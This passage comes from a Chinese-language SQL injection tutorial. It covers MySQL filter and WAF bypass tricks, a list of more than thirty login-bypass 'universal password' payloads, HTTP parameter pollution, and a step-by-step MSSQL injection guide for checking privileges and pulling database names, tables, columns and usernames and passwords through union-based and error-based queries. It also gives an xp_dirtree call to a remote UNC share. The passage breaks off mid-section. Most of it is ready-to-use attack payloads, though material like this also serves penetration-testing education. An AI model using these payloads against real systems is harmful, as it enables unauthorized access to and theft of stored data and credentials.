</p></li><li><p>@@datadir&#x3D;&#x3D;&gt;datadir()</p><p>@表示用户变量，@@表示系统变量</p></li></ul><h3 id="引号过滤绕过"><a href="#引号过滤绕过" class="headerlink" title="引号过滤绕过"></a>引号过滤绕过</h3><p>适用<strong>十六进制绕过</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line">=</span><br><span class="line">select column_name  from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p><strong>一般逗号在盲注中比较常见</strong></p><p><strong>使用from关键字绕过</strong>：对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from for</code>的方式来解决：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure><p><strong>使用join绕过：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2</span><br><span class="line">等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure><p><strong>使用offset绕过：对于limit可以使用offset来绕过：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1</span><br><span class="line">等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure><blockquote><p>需要注意，limit 1,2 指的是从第一行往后取2行（包括第一行和第二行)；而limit 1 offset 2是从第一行开始只取第二行</p></blockquote><p><strong>使用like绕过：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure><h3 id="过滤了union，select，where"><a href="#过滤了union，select，where" class="headerlink" title="过滤了union，select，where"></a>过滤了union，select，where</h3><p>注释符绕过：**<code>//</code>、<code>--</code>、<code>/**/</code>、<code>#</code>、<code>--+</code>、<code>---</code>、<code>;</code>、<code>%00</code>、<code>--a</code>**</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/NION /**/ SE/**/LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure><p>大小写绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure><p>内联注释绕过：<strong>把一些特有的仅在MySQL上的语句放在&#x2F;!…&#x2F;中</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure><h3 id="万能密码绕过"><a href="#万能密码绕过" class="headerlink" title="万能密码绕过"></a>万能密码绕过</h3><p>原理：</p><p>原验证登陆语句:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username= &#x27;&quot;.$username.&quot;&#x27; AND Password= &#x27;&quot;.md5($password).&quot;&#x27;</span><br></pre></td></tr></table></figure><p>输入 1′ or 1&#x3D;1 or ‘1’&#x3D;’1万能密码语句变为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username=&#x27;1&#x27; OR 1=1 OR &#x27;1&#x27;=&#x27;1&#x27; AND Password=&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>优先级关系：or&lt;and&lt;not</p><p><strong><code>&#39;1&#39;=&#39;1&#39; AND Password=&#39;EDFKGMZDFSDFDSFRRQWERRFGGG&#39;</code>为假，而<code>Username=&#39;1&#39; OR 1=1</code>肯定为真，所以整体为真</strong></p></blockquote><p><strong>万能密码</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h3 id="MySQL黑魔法绕过"><a href="#MySQL黑魔法绕过" class="headerlink" title="MySQL黑魔法绕过"></a>MySQL黑魔法绕过</h3><p>原理就是利用MySQL<strong>解析特性绕过过滤规则</strong>的技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and&#123;a 1=1&#125; and&#123;a 1=2&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>&#123;&#125;</code>：MySQL中通常用于标识变量或存储过程代码块，但在普通查询中可能被部分解析器忽略。</p><p><code>a</code>：无实际意义的占位符，用于绕过简单关键词过滤（如检测<code>1=</code>）</p></blockquote><p>若 <code>&#123;&#125;</code> 或 <code>a</code> 无法被解析，可能被静默忽略。</p><p>实际等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AND 1=1   -- 恒真</span><br><span class="line">AND 1=2   -- 恒假</span><br></pre></td></tr></table></figure><p>利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(database()=&#x27;Security&#x27;, &#123;a 1=1&#125;, &#123;a 1=2&#125;) --+ </span><br></pre></td></tr></table></figure><h3 id="HTTP参数污染绕过"><a href="#HTTP参数污染绕过" class="headerlink" title="HTTP参数污染绕过"></a>HTTP参数污染绕过</h3><p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p><p>其原理就是当浏览器在跟服务器进行交互过程中，浏览器往往会在GET&#x2F;POST请求里带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。</p><p>但是在HTTP协议中允许同样名称的参数多次出现，如：<code>http://www.baidu.com/?name=aa&amp;name=bb</code>。而针对这种情况，不同的服务器处理的方式会不一样，有的服务器是取第一个参数，即<code>name=aa</code>，有的服务器是取第二个参数<code>name=bb</code>，有的服务器两个参数都取，即<code>name=aa,bb</code>，而这种waf绕过一些服务器端的逻辑判断时非常有用。</p><p><strong>HPP参数污染</strong>可以用于绕过某些防火墙对于 SQL注入的检测，例如当Web服务器对多参数都同时选择时，我们可以用以下这种方式绕过某些防火墙：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com/index.asp?page=select 1,2,3 from table where id=1</span><br><span class="line"></span><br><span class="line">http://www.baidu.com/index.asp?page=select 1&amp;page=2,3 from table where id=1</span><br></pre></td></tr></table></figure><p>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同Web服务器对于出现多个参数时的选择：</p><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/1628845374145-fcc0997e-96c2-4bcf-9644-57db93d3a475.png"></p><p>HTTP参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果</p><p>以参数color&#x3D;red&amp;color&#x3D;blue为例:</p><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/1628844984291-02f867a8-634a-40bd-a5f5-5f9d95097a5a.png"></p><h2 id="其他数据库"><a href="#其他数据库" class="headerlink" title="其他数据库"></a>其他数据库</h2><h3 id="sql-server-mssql-注入"><a href="#sql-server-mssql-注入" class="headerlink" title="sql server(mssql)注入"></a>sql server(mssql)注入</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p><code>mssql</code>是指微软的<code>sql server</code>数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属于<strong>关系型数据库</strong>，端口号为<strong>1433</strong>。</p><p>数据库后缀名<code>.mdf</code>，注释符为<code>--</code></p><p><code>sql server</code>数据库有六个默认的库，分别为4个系统数据库：<strong>master 、model 、msdb 、tempdb</strong>，和2个实例数据库：ReportServer、ReportServerTempDB。</p><ul><li><p><strong>master</strong></p><p>用于记录所有 SQL Server 系统级别的信息，这些信息用于控制用户数据库和数据操作。</p><p>这个库也是mssql注入中最终重要的，其中<strong>储存了所有数据库名与存储过程</strong>。类比于mysql中的<code>information_schema</code></p></li><li><p><strong>model</strong></p><p>sql server为用户数据库提供的样板，新的用户数据库都以model数据库为基础</p></li><li><p><strong>msdb</strong></p><p>由Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息</p></li><li><p><strong>tempdb</strong></p><p>它为临时表和其他临时工作提供了一个存储区</p></li></ul><p>以 master 库为例，其中视图表 <code>master.dbo.sysdatabases</code> 储存所有数据库名，其他数据库的视图则储存它本库的表名与列名。每一个库的视图表都有 <code>syscolumns</code> 存储着所有的字段，可编程性储存着我们的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from master.dbo.sysdatabases;</span><br></pre></td></tr></table></figure><p>查询所有数据库的名称。</p><h4 id="权限判断"><a href="#权限判断" class="headerlink" title="权限判断"></a>权限判断</h4><p>sql server内部按作用范围分有三大主体：</p><ul><li><strong>Windows级别主体</strong></li><li><strong>服务器级别主体</strong></li><li><strong>数据库级别主体</strong></li></ul><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250419-210416.png"></p><p>对于<strong>服务器级别</strong>：</p><p>在微软官方文档中可看到，<code>IS_SRVROLEMEMBER ( &#39;role&#39; [ , &#39;login&#39; ] )</code>函数role的有效值是<strong>用户定义的服务器角色</strong>和以下<strong>固定服务器角色</strong>：</p><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/20210120145938.png"></p><table><thead><tr><th>返回值</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>login 不是 role 的成员。</td></tr><tr><td>1</td><td>login 是 role 的成员。</td></tr><tr><td>NULL</td><td>role 或 login 无效，或者没有查看角色成员身份的权限。</td></tr></tbody></table><p>构造语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select is_srvrolemember(&#x27;sysadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;serveradmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;setupadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;securityadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;diskadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;bulkadmin&#x27;))</span><br></pre></td></tr></table></figure><p><strong>sqlmap中可用<code>-is-dba</code>判断是否为管理员权限</strong></p><p>对于<strong>数据库级别</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select IS_MEMBER(&#x27;db_owner&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/20210120150401.png"></p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p><strong>注释符</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">-- </span><br><span class="line">;%00</span><br></pre></td></tr></table></figure><p><strong>空白字符</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br><span class="line"></span><br><span class="line">/**/</span><br></pre></td></tr></table></figure><p>语法定义符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; &gt; 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL 语言的非终结符。</span><br><span class="line"></span><br><span class="line">::= 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。</span><br><span class="line"></span><br><span class="line">[ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。</span><br><span class="line"></span><br><span class="line">&#123; &#125; 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。</span><br><span class="line"></span><br><span class="line">() 括号是分组运算符</span><br></pre></td></tr></table></figure><h4 id="注入常用参数-1"><a href="#注入常用参数-1" class="headerlink" title="注入常用参数"></a>注入常用参数</h4><h5 id="相关函数和表"><a href="#相关函数和表" class="headerlink" title="相关函数和表"></a>相关函数和表</h5><p>常用函数：</p><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>db_name()</td><td>返回当前数据库的名称</td></tr><tr><td>host_name()</td><td>返回计算机名称</td></tr><tr><td>current_user</td><td>返回当前数据库的用户名</td></tr><tr><td>substring()</td><td>字符串截取函数</td></tr><tr><td>@@version</td><td>查看数据库版本</td></tr><tr><td>char()</td><td>ASCII 转字符函数</td></tr><tr><td>cast(text as type)</td><td>字符类型转换，如果转换失败会将 text 结果报错显示在页面上</td></tr><tr><td>object_id()</td><td>根据表名返回数据库表名 ID</td></tr><tr><td>object_name()</td><td>根据 ID 返回数据库表名</td></tr><tr><td>col_name(object_id,column_id)</td><td>返回指定表中指定字段(列）的名称</td></tr><tr><td>dbid</td><td>数据库的唯一标识符，如dbid1&#x3D;master</td></tr><tr><td>SUSER_NAME()</td><td>获取当前登录的SQL Server账户</td></tr><tr><td>USER_NAME()</td><td>获取当前数据库用户</td></tr><tr><td>FILE_NAME()</td><td>获取逻辑文件名</td></tr><tr><td>TYPE_NAME()</td><td>获取数据类型名称</td></tr></tbody></table><p><strong>内置系统表:</strong></p><ul><li><p><strong>Sysdatabases 表</strong></p><p>Sysdatabases 表只保存在 master 数据库中，这个表中保存的是所有的库名，主要字段有：name 数据库名</p></li><li><p><strong>Sysobjects表</strong></p><p>SQLServer 中的每个数据库内都有此系统表，存放着数据库所有的表名。</p><p>而在该系统表中对我们有用的有三个字段：<code>NAME</code>字段和<code>XTYPE</code>字段和<code>ID</code>字段</p><ul><li><strong>name就是表名信息</strong></li><li><strong>xtype是代表表的类型，只有两个参数，<code>S</code>代表系统自带表，<code>U</code>代表用户创建的表</strong></li><li><strong>id字段的值用来连接syscolumns表(查列时会用到)</strong></li></ul></li><li><p><strong>Syscolumns 表</strong></p><p>Syscolumns 表位于每个数据库中，存放着数据库所有的字段名。主要字段有：name、id 分别是字段名称、表 ID，其中的 ID 是用 sysobjects 得到的表的 ID 号。</p></li></ul><h5 id="常用查询语句"><a href="#常用查询语句" class="headerlink" title="常用查询语句"></a>常用查询语句</h5><ul><li><p><strong>查看数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">select @@version;       #查询数据库的版本</span><br><span class="line">select @@servername;    #查询服务名</span><br><span class="line">select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</span><br><span class="line">select db_name();       #查询当前数据库名</span><br><span class="line">select db_name(1);      #查询第一个数据库名</span><br><span class="line">select db_name(2);      #查询第二个数据库名</span><br><span class="line">select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner </span><br><span class="line">;select user #查询是否支持多语句</span><br><span class="line">1&#x27; and host_name()=@@servername;-- #判断站库分离</span><br><span class="line">use tempdb              #切换到tempdb表  </span><br><span class="line">top n                   #查询前n条记录</span><br><span class="line">EXEC sp_spaceused @updateusage = N&#x27;TRUE&#x27;;  #查询当前数据库的大小</span><br><span class="line">sp_spaceused &#x27;表名&#x27;                #查询指定表名的大小</span><br><span class="line">EXEC master.sys.xp_dirtree &#x27;\\192.168.106.5\xx.txt&#x27;,0,1;</span><br></pre></td></tr></table></figure></li><li><p><strong>判断是否是SA权限</strong></p><p>对于<code>mssql</code>有三个权限，<code>sa</code>（最高权限，相当于system），<code>db</code>（文件管理，数据库操作等等，相当于user-administrator），<code>public</code>（数据库操作权限，相当于guest-isers)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">判断是否是SA权限</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)     </span><br><span class="line">判断是否是db_owner权限  </span><br><span class="line">select is_member(&#x27;db_owner&#x27;)</span><br><span class="line">判断是否是public权限</span><br><span class="line">select is_srvrolemember(&#x27;public&#x27;)</span><br></pre></td></tr></table></figure></li><li><p><strong>数据库连接</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server=服务器地址,端口; Database=数据库名; User Id=用户名; Password=密码;</span><br></pre></td></tr></table></figure></li><li><p><strong>查询数据库</strong></p><p><code>master.dbo.sysdatabases</code> 储存所有数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from sysdatabases     #查询数据库的个数,只有当前数据库是master的时候，才能执行该命令</span><br><span class="line">select name  from sysdatabases           #查询数据库的名字</span><br><span class="line">select * from sysdatabases               #查询所有数据库的信息</span><br></pre></td></tr></table></figure></li><li><p><strong>查询数据表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from sysobjects where xtype=&#x27;U&#x27; #查询当前数据库中表的个数</span><br><span class="line">select name from sysobjects where xtype=&#x27;U&#x27;  #查询当前数据库中所有表的名字</span><br><span class="line">select * from sysobjects where xtype=&#x27;U&#x27;    #查询当前数据库的所有表的详细信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from test..sysobjects where xtype=&#x27;U&#x27;  #查询指定test数据库中表的个数</span><br><span class="line">select name from test..sysobjects where xtype=&#x27;U&#x27;         #查询指定test数据库中表的名字</span><br><span class="line">select * from test..sysobjects where xtype=&#x27;U&#x27;            #查询指定test数据库中表的详细信息</span><br></pre></td></tr></table></figure><blockquote><p><code>..</code>表示默认架构dbo</p></blockquote></li><li><p><strong>查询列</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)     #查询指定test数据库的指定users表的列的个数</span><br><span class="line">select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的所有列的名字</span><br><span class="line">select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的列的详细信息</span><br></pre></td></tr></table></figure><blockquote><p>一般每个表名在 <code>sysobjects</code> 中唯一，<code>name=&#39;users&#39;</code> 应仅返回一条记录。使用 <code>MAX(id)</code> 是一种防御性写法，防止意外情况下多条记录导致错误。</p></blockquote></li><li><p><strong>查询数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from test..users          #查询test数据库user表的数据的条数</span><br><span class="line">select * from test..users                 #查询test数据库user表的所有数据</span><br></pre></td></tr></table></figure></li></ul><h4 id="注入姿势-1"><a href="#注入姿势-1" class="headerlink" title="注入姿势"></a>注入姿势</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>mssql联合注入一般不使用数字占位，而是null，因为使用数字占位可能会发生隐式转换</p><p>流程：</p><ul><li><p><strong>判断注入点</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1--</span><br></pre></td></tr></table></figure></li><li><p><strong>判断字段数</strong></p><p>一样利用order by判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 5--</span><br></pre></td></tr></table></figure></li><li><p><strong>爆库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select db_name()), null, null --</span><br></pre></td></tr></table></figure><blockquote><p>union all保留所有行，union会删除重复项</p></blockquote></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select top 1 name from 库名.dbo.sysobjects where xtype=&#x27;u&#x27;), null,null --</span><br></pre></td></tr></table></figure><blockquote><p>top 1查询前1条数据</p></blockquote></li><li><p><strong>爆字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),1) from sysobjects), null,null</span><br></pre></td></tr></table></figure><blockquote><p>object_id()：根据表名返回数据库表名id</p><p>col_name(object_id,column_id)：返回指定表中指定字段(列）的名称</p></blockquote></li><li><p><strong>获取数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select top 1 username from manage),null,null</span><br><span class="line"></span><br><span class="line">union all select 1,(select top 1 password from manage),null,null</span><br></pre></td></tr></table></figure></li></ul><h5 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h5><p>有两种方法：</p><ul><li><p><strong>通过将非数值类型强制转换为数值类型，触发隐式转换报错</strong></p><p>如<code>CAST(USER as int)</code>、<code>convert(int,db_name())</code>、<code>db_name()&gt;0</code>、<code>id=1 and 1=(select top 1 table_name from information_schema.tables);--</code>等等</p></li><li><p><strong>通过聚合函数与 GROUP BY 冲突</strong></p><p>如<code>id=1 group by info.id,info.name having 1=1</code></p></li></ul><p>利用函数：</p><ul><li><p><strong>cast()<strong>：将表达式转换为指定数据类型，</strong>ANSI标准函数</strong>，但无格式化参数。</p><p><code>CAST(USER as int)</code>将user当作int类型处理，触发隐式转换错误</p></li><li><p>**convert()**：用于把⽇期转换为新数据类型的通⽤函数。</p><p><code>convert(int,db_name())</code>，含义是将第二个参数的值转换成第一个参数的int类型。利用MSSQL在转换类型的时候就出错，来爆数据库等信息。</p></li><li><p><strong>quotename()<strong>：默认在要处理的参数左右加上两个中括号，起到</strong>分隔符</strong>的作用，避免出现<strong>sql关键字异常</strong></p><p><code>quotename(name)</code>，给查询出的多个表名、列名加入中括号，或者其他符号为分隔符，进行分割，可使SQL注入结果更清晰。</p></li><li><p>**for xml path(‘’)**：提供查询返回的结果为xml格式，此时返回的相当于一个字符串</p><p>将查询到的数据，通过xml进行显示，path指定xml元素结点（行节点），该语句可以将查询到的所有数据<strong>通过XML进行显示</strong></p></li><li><p><strong>stuff()<strong>：stuff()函数将表中列的内容</strong>横向输出</strong></p><p>stuff(param1, startIndex, length, param2)，将param1中自startIndex(SQL中都是从1开始，而非0)起，删除length个字符，然后用param2替换删掉的字符。</p></li></ul><p>流程：</p><ul><li><p><strong>爆库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;and db_name()&gt;0;--</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=convert(int,stuff((select quotename(name) from sys.databases for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--+</span><br></pre></td></tr></table></figure><blockquote><p>多个数据库情况下</p></blockquote></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27;);--</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;admin&#x27;) and name&lt;&gt;&#x27;id&#x27;);--</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight 